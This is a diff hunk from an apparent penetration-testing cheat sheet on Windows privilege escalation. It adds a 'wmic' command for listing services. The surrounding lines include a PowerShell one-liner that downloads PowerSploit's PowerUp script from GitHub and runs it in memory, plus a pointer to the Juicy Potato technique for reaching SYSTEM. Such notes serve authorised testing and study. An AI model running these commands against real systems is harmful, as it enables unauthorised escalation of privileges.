@@ -305,6 +305,9 @@ PHP:
 
 - `IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")`  
   `Invoke-AllChecks`
+  
+- Check services:  
+  `wmic service get name, displayname, pathname, startname`  
 
 - Check Privileges with: `whoami /priv`  
   If User has `SeImpersonate` or `SeAssignPrimaryToken` (most often service accounts!) you can get to SYSTEM by using the "potato": https://github.com/ohpe/juicy-potato  
